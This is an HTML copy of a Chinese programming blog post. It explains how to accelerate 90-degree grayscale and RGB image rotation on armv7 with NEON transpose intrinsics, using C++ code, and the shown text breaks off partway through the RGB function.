@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>基于NEON指令的图像旋转加速【armv7】 - 编程爱好者博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="基于NEON指令的图像旋转加速【armv7】" />
+<meta property="og:description" content="目录
+前言
+知识直通车
+NEON转置指令
+右旋90
+4x4矩阵右旋实例
+灰度图（单通道）右旋90
+彩图（RGB三通道）右旋90
+左旋90
+4x4矩阵左旋实例
+灰度图（单通道）左旋90
+彩图（RGB三通道）左旋90 RK3288-linux(硬浮点) 耗时对比
+前言 图像旋转就是简单的坐标变换，1080p的图像右旋90度耗时时间，在RK3288-linux(硬浮点)板子上，opencv4.1也就17ms搞定，本没啥好讲的，但是凡事追求极致嘛，能加速的就给他加速一把，当然这态度的问题只是其中一个原因；另外一个原因是最近在公司遇到一个对旋转90的加速需求，在某些场景下，需要做图像旋转然后再送入神经网络做人脸检测，而由于整个人脸识别整个工程的运行导致板子的资源极大消耗，使得简单的图像旋转的时间延长至三四十ms，这是很可怕的，人脸检测也就二三十ms左右吧，所以这是写这篇文章的直接导火索。
+当然，类似的利用NEON对矩阵旋转加速的解决方案，网上已经有人发表过了，比如最早的文章https://www.cnblogs.com/hrlnw/p/3723072.html，本篇博客会在此基础上进行扩展，增加RGB彩图的加速旋转代码并补充opencv与本篇算法在RK3288上的旋转耗时数据对比。
+知识直通车 矩阵右旋90的NEON加速：https://www.cnblogs.com/hrlnw/p/3723072.html
+矩阵右旋180度和270(-90)度：https://www.cnblogs.com/hrlnw/p/3767853.html
+opencv右旋90、180、270度：https://www.cnblogs.com/alexYuin/p/9493242.html
+opencv利用transpose&#43;flip实现图像旋转，虽然比仿射变换函数warpaffine要快不少，但是分步的做法总是没有一步到位的解决方案来得快的，接下来就开始介绍一步到位法了。
+NEON转置指令 可以用neon进行旋转加速的关键要感谢arm出品的vtrn_u8/u16/u32..系列的转置指令，虽然是2x2的转置指令，但是对于矩阵旋转完全够用，取决于怎么用了。
+转置的具体情况如下示意，应该很清楚就不多少了
+uint8x8_t mat0,mat1; uint8x8x2_t result=vtrn_u8(mat0,mat1); 右旋90 4x4矩阵右旋实例 在介绍图形旋转代码之前先用个小矩阵实例说明一下算法的可行性。先说右旋90度：
+旋转前矩阵 旋转后矩阵
+算法步骤：
+1）相邻两行每2x2做转置(但是注意输入顺序是倒的，比如前两行，第二行作为vtrn的第一个参数输入，第一行作为vtrn的第二个参数输入)，结果如下：
+原矩阵 相邻行倒置 相邻行转置 2）每行两个像素值看做一个整体，隔行转置，依然倒着输入，即2、0行一组输入，3、1行一组输入，这样便可以得到最终的矩阵旋转结果了，过程如下：
+上一步结果 隔行倒置 隔行转置
+例子看明白了，那下面图像旋转也就很简单了，soeasy啊~
+图像旋转与矩阵旋转的区别就是.....嗯.....图像比较大，下就分块喽，那从指令读取数据的角度以及代码量及速度方面的考虑我们将图像分成8x8的小块矩阵一个一个做旋转然后再放到最终图像相应的位置就可以了。
+灰度图（单通道）右旋90 static void rotate_pos90_gray(uint8_t* src, size_t sstep, uint8_t* dst, size_t dstep, int w,int h) { uint8x8x4_t mat[2]; uint8x8x2_t temp8x8x2[4]; uint16x4x4_t temp16x4x4[2]; uint16x4x2_t temp16x4x2[4]; uint32x2x4_t temp32x2x4[2]; uint32x2x2_t temp32x2x2[4]; int dw=w&amp;7; int sw=w-dw; int dh=h&amp;7; int sh=h-dh; for(int y=0;y&lt;sh;y&#43;=8) { uint8_t* pIndexY = src&#43;y*sstep; int tr_x = h-y-8; for(int x=0;x&lt;sw;x&#43;=8) { uint8_t* ptr_y = dst&#43;x*dstep; //load 8x8 matrix mat[0]." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchobby.github.io/posts/d7e9150cf70d7901e9133e1839207485/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-10-27T00:04:47+08:00" />
+<meta property="article:modified_time" content="2019-10-27T00:04:47+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程爱好者博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">基于NEON指令的图像旋转加速【armv7】</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <p id="main-toc"><strong>目录</strong></p> 
+<p id="main-toc-toc" style="margin-left:40px;"><a href="#main-toc" rel="nofollow">前言</a></p> 
+<p id="%E7%9F%A5%E8%AF%86%E7%9B%B4%E9%80%9A%E8%BD%A6-toc" style="margin-left:40px;"><a href="#%E7%9F%A5%E8%AF%86%E7%9B%B4%E9%80%9A%E8%BD%A6" rel="nofollow">知识直通车</a></p> 
+<p id="NEON%E8%BD%AC%E7%BD%AE%E6%8C%87%E4%BB%A4-toc" style="margin-left:40px;"><a href="#NEON%E8%BD%AC%E7%BD%AE%E6%8C%87%E4%BB%A4" rel="nofollow">NEON转置指令</a></p> 
+<p id="%E5%8F%B3%E6%97%8B-toc" style="margin-left:40px;"><a href="#%E5%8F%B3%E6%97%8B" rel="nofollow">右旋90</a></p> 
+<p id="4x4%E7%9F%A9%E9%98%B5%E5%8F%B3%E6%97%8B%E5%AE%9E%E4%BE%8B-toc" style="margin-left:80px;"><a href="#4x4%E7%9F%A9%E9%98%B5%E5%8F%B3%E6%97%8B%E5%AE%9E%E4%BE%8B" rel="nofollow">4x4矩阵右旋实例</a></p> 
+<p id="%E7%81%B0%E5%BA%A6%EF%BC%88%E5%8D%95%E9%80%9A%E9%81%93%EF%BC%89%E5%9B%BE%E5%83%8F%E5%8F%B3%E6%97%8B90-toc" style="margin-left:80px;"><a href="#%E7%81%B0%E5%BA%A6%EF%BC%88%E5%8D%95%E9%80%9A%E9%81%93%EF%BC%89%E5%9B%BE%E5%83%8F%E5%8F%B3%E6%97%8B90" rel="nofollow">灰度图（单通道）右旋90</a></p> 
+<p id="%E5%BD%A9%E5%9B%BE%EF%BC%88RGB%E4%B8%89%E9%80%9A%E9%81%93%EF%BC%89%E5%8F%B3%E6%97%8B90-toc" style="margin-left:80px;"><a href="#%E5%BD%A9%E5%9B%BE%EF%BC%88RGB%E4%B8%89%E9%80%9A%E9%81%93%EF%BC%89%E5%8F%B3%E6%97%8B90" rel="nofollow">彩图（RGB三通道）右旋90</a></p> 
+<p id="%E5%B7%A6%E6%97%8B-toc" style="margin-left:40px;"><a href="#%E5%B7%A6%E6%97%8B" rel="nofollow">左旋90</a></p> 
+<p id="4x4%E7%9F%A9%E9%98%B5%E5%B7%A6%E6%97%8B%E5%AE%9E%E4%BE%8B-toc" style="margin-left:80px;"><a href="#4x4%E7%9F%A9%E9%98%B5%E5%B7%A6%E6%97%8B%E5%AE%9E%E4%BE%8B" rel="nofollow">4x4矩阵左旋实例</a></p> 
+<p id="%E7%81%B0%E5%BA%A6%EF%BC%88%E5%8D%95%E9%80%9A%E9%81%93%EF%BC%89%E5%9B%BE%E5%83%8F%E5%B7%A6%E6%97%8B90-toc" style="margin-left:80px;"><a href="#%E7%81%B0%E5%BA%A6%EF%BC%88%E5%8D%95%E9%80%9A%E9%81%93%EF%BC%89%E5%9B%BE%E5%83%8F%E5%B7%A6%E6%97%8B90" rel="nofollow">灰度图（单通道）左旋90</a></p> 
+<p id="%E5%BD%A9%E5%9B%BE%EF%BC%88RGB%E4%B8%89%E9%80%9A%E9%81%93%EF%BC%89%E5%B7%A6%E6%97%8B90%C2%A0-toc" style="margin-left:80px;"><a href="#%E5%BD%A9%E5%9B%BE%EF%BC%88RGB%E4%B8%89%E9%80%9A%E9%81%93%EF%BC%89%E5%B7%A6%E6%97%8B90%C2%A0" rel="nofollow">彩图（RGB三通道）左旋90 </a></p> 
+<p id="RK3288-linux(%E7%A1%AC%E6%B5%AE%E7%82%B9)%C2%A0%E8%80%97%E6%97%B6%E5%AF%B9%E6%AF%94-toc" style="margin-left:40px;"><a href="#RK3288-linux%28%E7%A1%AC%E6%B5%AE%E7%82%B9%29%C2%A0%E8%80%97%E6%97%B6%E5%AF%B9%E6%AF%94" rel="nofollow">RK3288-linux(硬浮点) 耗时对比</a></p> 
+<hr id="hr-toc"> 
+<h3>前言</h3> 
+<p>图像旋转就是简单的坐标变换，1080p的图像右旋90度耗时时间，在RK3288-linux(硬浮点)板子上，opencv4.1也就17ms搞定，本没啥好讲的，但是凡事追求极致嘛，能加速的就给他加速一把，当然这态度的问题只是其中一个原因；另外一个原因是最近在公司遇到一个对旋转90的加速需求，在某些场景下，需要做图像旋转然后再送入神经网络做人脸检测，而由于整个人脸识别整个工程的运行导致板子的资源极大消耗，使得简单的图像旋转的时间延长至三四十ms，这是很可怕的，人脸检测也就二三十ms左右吧，所以这是写这篇文章的直接导火索。</p> 
+<p>当然，类似的利用NEON对矩阵旋转加速的解决方案，网上已经有人发表过了，比如最早的文章<a href="https://www.cnblogs.com/hrlnw/p/3723072.html" rel="nofollow">https://www.cnblogs.com/hrlnw/p/3723072.html</a>，本篇博客会在此基础上进行扩展，增加RGB彩图的加速旋转代码并补充opencv与本篇算法在RK3288上的旋转耗时数据对比。</p> 
+<h4> </h4> 
+<h3 id="%E7%9F%A5%E8%AF%86%E7%9B%B4%E9%80%9A%E8%BD%A6">知识直通车</h3> 
+<p>矩阵右旋90的NEON加速：<a href="https://www.cnblogs.com/hrlnw/p/3723072.html" rel="nofollow">https://www.cnblogs.com/hrlnw/p/3723072.html</a></p> 
+<p>矩阵右旋180度和270(-90)度：<a href="https://www.cnblogs.com/hrlnw/p/3767853.html" rel="nofollow">https://www.cnblogs.com/hrlnw/p/3767853.html</a></p> 
+<p>opencv右旋90、180、270度：<a href="https://www.cnblogs.com/alexYuin/p/9493242.html" rel="nofollow">https://www.cnblogs.com/alexYuin/p/9493242.html</a></p> 
+<p>opencv利用transpose+flip实现图像旋转，虽然比仿射变换函数warpaffine要快不少，但是分步的做法总是没有一步到位的解决方案来得快的，接下来就开始介绍一步到位法了。</p> 
+<p> </p> 
+<h3 id="NEON%E8%BD%AC%E7%BD%AE%E6%8C%87%E4%BB%A4">NEON转置指令</h3> 
+<p>可以用neon进行旋转加速的关键要感谢arm出品的vtrn_u8/u16/u32..系列的转置指令，虽然是2x2的转置指令，但是对于矩阵旋转完全够用，取决于怎么用了。</p> 
+<p>转置的具体情况如下示意，应该很清楚就不多少了</p> 
+<pre class="has"><code class="language-cpp">uint8x8_t mat0,mat1;
+uint8x8x2_t result=vtrn_u8(mat0,mat1);</code></pre> 
+<p><img alt="" class="has" height="73" src="https://images2.imgbox.com/ae/fb/bXKNrCCC_o.png" width="325">               <img alt="" class="has" height="72" src="https://images2.imgbox.com/5f/c6/eZ4xrp0u_o.png" width="355"></p> 
+<h3> </h3> 
+<h3 id="%E5%8F%B3%E6%97%8B">右旋90</h3> 
+<h4 id="4x4%E7%9F%A9%E9%98%B5%E5%8F%B3%E6%97%8B%E5%AE%9E%E4%BE%8B">4x4矩阵右旋实例</h4> 
+<p>在介绍图形旋转代码之前先用个小矩阵实例说明一下算法的可行性。先说右旋90度：</p> 
+<p>      旋转前矩阵                            旋转后矩阵</p> 
+<p><img alt="" class="has" height="136" src="https://images2.imgbox.com/0d/d4/dyHDtvXV_o.png" width="140">              <img alt="" class="has" height="135" src="https://images2.imgbox.com/02/23/SwIViGRo_o.png" width="139"></p> 
+<p>算法步骤：</p> 
+<p>1）相邻两行每2x2做转置(但是注意输入顺序是倒的，比如前两行，第二行作为vtrn的第一个参数输入，第一行作为vtrn的第二个参数输入)，结果如下：</p> 
+<p>           原矩阵                               相邻行倒置                           相邻行转置                          </p> 
+<p><img alt="" class="has" height="136" src="https://images2.imgbox.com/91/93/JrM0i9fu_o.png" width="140">               <img alt="" class="has" height="136" src="https://images2.imgbox.com/ae/53/hQJmsTTC_o.png" width="139">              <img alt="" class="has" height="135" src="https://images2.imgbox.com/cb/e5/XFilb3At_o.png" width="139"></p> 
+<p>2）每行两个像素值看做一个整体，隔行转置，依然倒着输入，即2、0行一组输入，3、1行一组输入，这样便可以得到最终的矩阵旋转结果了，过程如下：</p> 
+<p>       上一步结果                              隔行倒置                              隔行转置</p> 
+<p><img alt="" class="has" height="135" src="https://images2.imgbox.com/d6/28/rPUppu6S_o.png" width="139">               <img alt="" class="has" height="135" src="https://images2.imgbox.com/b2/1b/4EotX7nC_o.png" width="138">              <img alt="" class="has" height="135" src="https://images2.imgbox.com/10/cf/Nob8GoiA_o.png" width="139"></p> 
+<p>例子看明白了，那下面图像旋转也就很简单了，soeasy啊~</p> 
+<p>图像旋转与矩阵旋转的区别就是.....嗯.....图像比较大，下就分块喽，那从指令读取数据的角度以及代码量及速度方面的考虑我们将图像分成8x8的小块矩阵一个一个做旋转然后再放到最终图像相应的位置就可以了。</p> 
+<h4 id="%E7%81%B0%E5%BA%A6%EF%BC%88%E5%8D%95%E9%80%9A%E9%81%93%EF%BC%89%E5%9B%BE%E5%83%8F%E5%8F%B3%E6%97%8B90">灰度图（单通道）右旋90</h4> 
+<pre class="has"><code class="language-cpp">
+static void rotate_pos90_gray(uint8_t* src, size_t sstep, uint8_t* dst, size_t dstep, int w,int h)
+{
+    uint8x8x4_t     mat[2];
+    uint8x8x2_t     temp8x8x2[4];
+    uint16x4x4_t    temp16x4x4[2];
+    uint16x4x2_t    temp16x4x2[4];
+    uint32x2x4_t    temp32x2x4[2];
+    uint32x2x2_t    temp32x2x2[4];
+
+    int dw=w&amp;7; int sw=w-dw;
+    int dh=h&amp;7; int sh=h-dh;
+    
+    for(int y=0;y&lt;sh;y+=8)
+    {
+		uint8_t* pIndexY = src+y*sstep;
+		int tr_x = h-y-8;
+        for(int x=0;x&lt;sw;x+=8)
+        {
+			uint8_t* ptr_y = dst+x*dstep;
+
+            //load 8x8 matrix
+            mat[0].val[0] = vld1_u8(pIndexY+        x);
+            mat[0].val[1] = vld1_u8(pIndexY+  sstep+x);
+            mat[0].val[2] = vld1_u8(pIndexY+2*sstep+x);
+            mat[0].val[3] = vld1_u8(pIndexY+3*sstep+x);
+            mat[1].val[0] = vld1_u8(pIndexY+4*sstep+x);
+            mat[1].val[1] = vld1_u8(pIndexY+5*sstep+x);
+            mat[1].val[2] = vld1_u8(pIndexY+6*sstep+x);
+            mat[1].val[3] = vld1_u8(pIndexY+7*sstep+x);
+
+            //transpose for two nearby rows 
+            temp8x8x2[0] = vtrn_u8(mat[0].val[1],mat[0].val[0]); 
+            temp8x8x2[1] = vtrn_u8(mat[0].val[3],mat[0].val[2]); 
+            temp8x8x2[2] = vtrn_u8(mat[1].val[1],mat[1].val[0]); 
+            temp8x8x2[3] = vtrn_u8(mat[1].val[3],mat[1].val[2]); 
+
+            //interpret two 8bit to one 16bit data
+            temp16x4x4[0].val[0] = vreinterpret_u16_u8(temp8x8x2[0].val[0]);
+            temp16x4x4[0].val[1] = vreinterpret_u16_u8(temp8x8x2[0].val[1]);
+            temp16x4x4[0].val[2] = vreinterpret_u16_u8(temp8x8x2[1].val[0]);
+            temp16x4x4[0].val[3] = vreinterpret_u16_u8(temp8x8x2[1].val[1]);
+            temp16x4x4[1].val[0] = vreinterpret_u16_u8(temp8x8x2[2].val[0]);
+            temp16x4x4[1].val[1] = vreinterpret_u16_u8(temp8x8x2[2].val[1]);
+            temp16x4x4[1].val[2] = vreinterpret_u16_u8(temp8x8x2[3].val[0]);
+            temp16x4x4[1].val[3] = vreinterpret_u16_u8(temp8x8x2[3].val[1]);
+
+            //transpose for two interleaved rows 
+            temp16x4x2[0] = vtrn_u16(temp16x4x4[0].val[2],temp16x4x4[0].val[0]); 
+            temp16x4x2[1] = vtrn_u16(temp16x4x4[0].val[3],temp16x4x4[0].val[1]); 
+            temp16x4x2[2] = vtrn_u16(temp16x4x4[1].val[2],temp16x4x4[1].val[0]); 
+            temp16x4x2[3] = vtrn_u16(temp16x4x4[1].val[3],temp16x4x4[1].val[1]); 
+
+            temp32x2x4[0].val[0] = vreinterpret_u32_u16(temp16x4x2[0].val[0]);
+            temp32x2x4[0].val[1] = vreinterpret_u32_u16(temp16x4x2[0].val[1]);
+            temp32x2x4[0].val[2] = vreinterpret_u32_u16(temp16x4x2[1].val[0]);
+            temp32x2x4[0].val[3] = vreinterpret_u32_u16(temp16x4x2[1].val[1]);
+            temp32x2x4[1].val[0] = vreinterpret_u32_u16(temp16x4x2[2].val[0]);
+            temp32x2x4[1].val[1] = vreinterpret_u32_u16(temp16x4x2[2].val[1]);
+            temp32x2x4[1].val[2] = vreinterpret_u32_u16(temp16x4x2[3].val[0]);
+            temp32x2x4[1].val[3] = vreinterpret_u32_u16(temp16x4x2[3].val[1]);
+
+            temp32x2x2[0] = vtrn_u32(temp32x2x4[1].val[0],temp32x2x4[0].val[0]); 
+            temp32x2x2[1] = vtrn_u32(temp32x2x4[1].val[1],temp32x2x4[0].val[1]); 
+            temp32x2x2[2] = vtrn_u32(temp32x2x4[1].val[2],temp32x2x4[0].val[2]); 
+            temp32x2x2[3] = vtrn_u32(temp32x2x4[1].val[3],temp32x2x4[0].val[3]); 
+
+            mat[0].val[0] = vreinterpret_u8_u32(temp32x2x2[0].val[0]); 
+            mat[0].val[1] = vreinterpret_u8_u32(temp32x2x2[2].val[0]); 
+            mat[0].val[2] = vreinterpret_u8_u32(temp32x2x2[1].val[0]); 
+            mat[0].val[3] = vreinterpret_u8_u32(temp32x2x2[3].val[0]); 
+            mat[1].val[0] = vreinterpret_u8_u32(temp32x2x2[0].val[1]); 
+            mat[1].val[1] = vreinterpret_u8_u32(temp32x2x2[2].val[1]); 
+            mat[1].val[2] = vreinterpret_u8_u32(temp32x2x2[1].val[1]); 
+            mat[1].val[3] = vreinterpret_u8_u32(temp32x2x2[3].val[1]); 
+
+            vst1_u8(ptr_y        +tr_x, mat[0].val[0]);
+            vst1_u8(ptr_y+  dstep+tr_x, mat[0].val[1]);
+            vst1_u8(ptr_y+2*dstep+tr_x, mat[0].val[2]);
+            vst1_u8(ptr_y+3*dstep+tr_x, mat[0].val[3]);
+            vst1_u8(ptr_y+4*dstep+tr_x, mat[1].val[0]);
+            vst1_u8(ptr_y+5*dstep+tr_x, mat[1].val[1]);
+            vst1_u8(ptr_y+6*dstep+tr_x, mat[1].val[2]);
+            vst1_u8(ptr_y+7*dstep+tr_x, mat[1].val[3]);
+        }
+    }
+    
+    for(int y=sh;y&lt;h;y++)
+    {
+        int tr_x = h-y-1;
+        for(int x=0;x&lt;w;x++)
+		{
+            uint8_t* ptr_y = dst+x*dstep;
+			ptr_y[tr_x] = src[y*sstep+x];
+		}
+    }
+
+    for(int x=sw;x&lt;w;x++)
+	{    
+        uint8_t* ptr_y = dst+x*dstep;
+        for(int y=0;y&lt;sh;y++)
+        {
+            int tr_x = h-y-1;
+ 			ptr_y[tr_x] = src[y*sstep+x];
+        }
+    }
+
+    return;
+}</code></pre> 
+<h4 id="%E5%BD%A9%E5%9B%BE%EF%BC%88RGB%E4%B8%89%E9%80%9A%E9%81%93%EF%BC%89%E5%8F%B3%E6%97%8B90">彩图（RGB三通道）右旋90</h4> 
+<pre class="has"><code class="language-cpp">static void rotate_pos90_rgb(uint8_t* src, size_t sstep, uint8_t* dst, size_t dstep, int w,int h, int cn)
+{
+    uint8x8x4_t mat10,mat11,mat12;
+    uint8x8x4_t mat20,mat21,mat22;
+    uint8x8x2_t temp10,temp11,temp12;
+    uint8x8x2_t temp20,temp21,temp22;
+    uint8x8x2_t temp30,temp31,temp32;
+    uint8x8x2_t temp40,temp41,temp42;
+    uint16x4x4_t temp110,temp111,temp112;
+    uint16x4x4_t temp120,temp121,temp122;
+    uint16x4x2_t temp50,temp51,temp52;
+    uint16x4x2_t temp60,temp61,temp62;
+    uint16x4x2_t temp70,temp71,temp72;
+    uint16x4x2_t temp80,temp81,temp82;
+    uint32x2x4_t temp210,temp211,temp212;
+    uint32x2x4_t temp220,temp221,temp222;
+    uint32x2x2_t res10,res11,res12;
+    uint32x2x2_t res20,res21,res22;
+    uint32x2x2_t res30,res31,res32;
+    uint32x2x2_t res40,res41,res42;
+
+    int dw=w&amp;7; int sw=w-dw;
+    int dh=h&amp;7; int sh=h-dh;
+    
+    int x,y;
+    for(y=0;y&lt;sh;y=y+8)
+    {
+		uint8_t* pIndexY = src+y*sstep;
+		int tr_x = (h-y-8)*cn;
+        for(x=0;x&lt;sw;x=x+8)
+        {
+			int xIndex = x * cn;
+			uint8_t* ptr_y = dst+x*dstep;
+
+			uint8x8x3_t v = vld3_u8(pIndexY + xIndex);
+			mat10.val[0] = v.val[0]; mat11.val[0] = v.val[1]; mat12.val[0] = v.val[2];
+			
+			v = vld3_u8((pIndexY +   sstep) + xIndex);
+            mat10.val[1] = v.val[0]; mat11.val[1] = v.val[1]; mat12.val[1] = v.val[2];
+
+            v = vld3_u8((pIndexY + 2*sstep) + xIndex);
+			mat10.val[2] = v.val[0]; mat11.val[2] = v.val[1]; mat12.val[2] = v.val[2];
+
+            v = vld3_u8((pIndexY + 3*sstep) + xIndex);
+			mat10.val[3] = v.val[0]; mat11.val[3] = v.val[1]; mat12.val[3] = v.val[2];
+			
+			v = vld3_u8((pIndexY + 4*sstep) + xIndex);
+			mat20.val[0] = v.val[0]; mat21.val[0] = v.val[1]; mat22.val[0] = v.val[2];
+			
+			v = vld3_u8((pIndexY + 5*sstep) + xIndex);
+            mat20.val[1] = v.val[0]; mat21.val[1] = v.val[1]; mat22.val[1] = v.val[2];
+
+            v = vld3_u8((pIndexY + 6*sstep) + xIndex);
+			mat20.val[2] = v.val[0]; mat21.val[2] = v.val[1]; mat22.val[2] = v.val[2];
+
+            v = vld3_u8((pIndexY + 7*sstep) + xIndex);
+			mat20.val[3] = v.val[0]; mat21.val[3] = v.val[1]; mat22.val[3] = v.val[2];
+
+            temp10=vtrn_u8(mat10.val[1],mat10.val[0]); temp11=vtrn_u8(mat11.val[1],mat11.val[0]); temp12=vtrn_u8(mat12.val[1],mat12.val[0]); 
+            temp20=vtrn_u8(mat10.val[3],mat10.val[2]); temp21=vtrn_u8(mat11.val[3],mat11.val[2]); temp22=vtrn_u8(mat12.val[3],mat12.val[2]);
+            temp30=vtrn_u8(mat20.val[1],mat20.val[0]); temp31=vtrn_u8(mat21.val[1],mat21.val[0]); temp32=vtrn_u8(mat22.val[1],mat22.val[0]);
+            temp40=vtrn_u8(mat20.val[3],mat20.val[2]); temp41=vtrn_u8(mat21.val[3],mat21.val[2]); temp42=vtrn_u8(mat22.val[3],mat22.val[2]);
+
+            temp110.val[0]=vreinterpret_u16_u8(temp10.val[0]); temp111.val[0]=vreinterpret_u16_u8(temp11.val[0]); temp112.val[0]=vreinterpret_u16_u8(temp12.val[0]);
+            temp110.val[1]=vreinterpret_u16_u8(temp10.val[1]); temp111.val[1]=vreinterpret_u16_u8(temp11.val[1]); temp112.val[1]=vreinterpret_u16_u8(temp12.val[1]);
+            temp110.val[2]=vreinterpret_u16_u8(temp20.val[0]); temp111.val[2]=vreinterpret_u16_u8(temp21.val[0]); temp112.val[2]=vreinterpret_u16_u8(temp22.val[0]);
+            temp110.val[3]=vreinterpret_u16_u8(temp20.val[1]); temp111.val[3]=vreinterpret_u16_u8(temp21.val[1]); temp112.val[3]=vreinterpret_u16_u8(temp22.val[1]);
+            temp120.val[0]=vreinterpret_u16_u8(temp30.val[0]); temp121.val[0]=vreinterpret_u16_u8(temp31.val[0]); temp122.val[0]=vreinterpret_u16_u8(temp32.val[0]);
+            temp120.val[1]=vreinterpret_u16_u8(temp30.val[1]); temp121.val[1]=vreinterpret_u16_u8(temp31.val[1]); temp122.val[1]=vreinterpret_u16_u8(temp32.val[1]);
+            temp120.val[2]=vreinterpret_u16_u8(temp40.val[0]); temp121.val[2]=vreinterpret_u16_u8(temp41.val[0]); temp122.val[2]=vreinterpret_u16_u8(temp42.val[0]);
+            temp120.val[3]=vreinterpret_u16_u8(temp40.val[1]); temp121.val[3]=vreinterpret_u16_u8(temp41.val[1]); temp122.val[3]=vreinterpret_u16_u8(temp42.val[1]);
+
+            temp50=vtrn_u16(temp110.val[2],temp110.val[0]); temp51=vtrn_u16(temp111.val[2],temp111.val[0]); temp52=vtrn_u16(temp112.val[2],temp112.val[0]);
+            temp60=vtrn_u16(temp110.val[3],temp110.val[1]); temp61=vtrn_u16(temp111.val[3],temp111.val[1]); temp62=vtrn_u16(temp112.val[3],temp112.val[1]);
+            temp70=vtrn_u16(temp120.val[2],temp120.val[0]); temp71=vtrn_u16(temp121.val[2],temp121.val[0]); temp72=vtrn_u16(temp122.val[2],temp122.val[0]);
+            temp80=vtrn_u16(temp120.val[3],temp120.val[1]); temp81=vtrn_u16(temp121.val[3],temp121.val[1]); temp82=vtrn_u16(temp122.val[3],temp122.val[1]);
+
+            temp210.val[0]=vreinterpret_u32_u16(temp50.val[0]); temp211.val[0]=vreinterpret_u32_u16(temp51.val[0]); temp212.val[0]=vreinterpret_u32_u16(temp52.val[0]);
+            temp210.val[1]=vreinterpret_u32_u16(temp50.val[1]); temp211.val[1]=vreinterpret_u32_u16(temp51.val[1]); temp212.val[1]=vreinterpret_u32_u16(temp52.val[1]);
+            temp210.val[2]=vreinterpret_u32_u16(temp60.val[0]); temp211.val[2]=vreinterpret_u32_u16(temp61.val[0]); temp212.val[2]=vreinterpret_u32_u16(temp62.val[0]);
+            temp210.val[3]=vreinterpret_u32_u16(temp60.val[1]); temp211.val[3]=vreinterpret_u32_u16(temp61.val[1]); temp212.val[3]=vreinterpret_u32_u16(temp62.val[1]);
+            temp220.val[0]=vreinterpret_u32_u16(temp70.val[0]); temp221.val[0]=vreinterpret_u32_u16(temp71.val[0]); temp222.val[0]=vreinterpret_u32_u16(temp72.val[0]);
+            temp220.val[1]=vreinterpret_u32_u16(temp70.val[1]); temp221.val[1]=vreinterpret_u32_u16(temp71.val[1]); temp222.val[1]=vreinterpret_u32_u16(temp72.val[1]);
+            temp220.val[2]=vreinterpret_u32_u16(temp80.val[0]); temp221.val[2]=vreinterpret_u32_u16(temp81.val[0]); temp222.val[2]=vreinterpret_u32_u16(temp82.val[0]);
+            temp220.val[3]=vreinterpret_u32_u16(temp80.val[1]); temp221.val[3]=vreinterpret_u32_u16(temp81.val[1]); temp222.val[3]=vreinterpret_u32_u16(temp82.val[1]);
+
+            res10=vtrn_u32(temp220.val[0],temp210.val[0]); res11=vtrn_u32(temp221.val[0],temp211.val[0]); res12=vtrn_u32(temp222.val[0],temp212.val[0]);
+            res20=vtrn_u32(temp220.val[1],temp210.val[1]); res21=vtrn_u32(temp221.val[1],temp211.val[1]); res22=vtrn_u32(temp222.val[1],temp212.val[1]);
+            res30=vtrn_u32(temp220.val[2],temp210.val[2]); res31=vtrn_u32(temp221.val[2],temp211.val[2]); res32=vtrn_u32(temp222.val[2],temp212.val[2]);
+            res40=vtrn_u32(temp220.val[3],temp210.val[3]); res41=vtrn_u32(temp221.val[3],temp211.val[3]); res42=vtrn_u32(temp222.val[3],temp212.val[3]);
+
+            mat10.val[0]=vreinterpret_u8_u32(res10.val[0]); mat11.val[0]=vreinterpret_u8_u32(res11.val[0]); mat12.val[0]=vreinterpret_u8_u32(res12.val[0]);
+            mat10.val[1]=vreinterpret_u8_u32(res30.val[0]); mat11.val[1]=vreinterpret_u8_u32(res31.val[0]); mat12.val[1]=vreinterpret_u8_u32(res32.val[0]);
+            mat10.val[2]=vreinterpret_u8_u32(res20.val[0]); mat11.val[2]=vreinterpret_u8_u32(res21.val[0]); mat12.val[2]=vreinterpret_u8_u32(res22.val[0]);
+            mat10.val[3]=vreinterpret_u8_u32(res40.val[0]); mat11.val[3]=vreinterpret_u8_u32(res41.val[0]); mat12.val[3]=vreinterpret_u8_u32(res42.val[0]);
+            mat20.val[0]=vreinterpret_u8_u32(res10.val[1]); mat21.val[0]=vreinterpret_u8_u32(res11.val[1]); mat22.val[0]=vreinterpret_u8_u32(res12.val[1]);
+            mat20.val[1]=vreinterpret_u8_u32(res30.val[1]); mat21.val[1]=vreinterpret_u8_u32(res31.val[1]); mat22.val[1]=vreinterpret_u8_u32(res32.val[1]);
+            mat20.val[2]=vreinterpret_u8_u32(res20.val[1]); mat21.val[2]=vreinterpret_u8_u32(res21.val[1]); mat22.val[2]=vreinterpret_u8_u32(res22.val[1]);
+            mat20.val[3]=vreinterpret_u8_u32(res40.val[1]); mat21.val[3]=vreinterpret_u8_u32(res41.val[1]); mat22.val[3]=vreinterpret_u8_u32(res42.val[1]);
+
+            v_store_interleave_rotate(ptr_y        +tr_x,mat10.val[0],mat11.val[0],mat12.val[0]);    
+            v_store_interleave_rotate(ptr_y+  dstep+tr_x,mat10.val[1],mat11.val[1],mat12.val[1]);
+            v_store_interleave_rotate(ptr_y+2*dstep+tr_x,mat10.val[2],mat11.val[2],mat12.val[2]);
+            v_store_interleave_rotate(ptr_y+3*dstep+tr_x,mat10.val[3],mat11.val[3],mat12.val[3]);
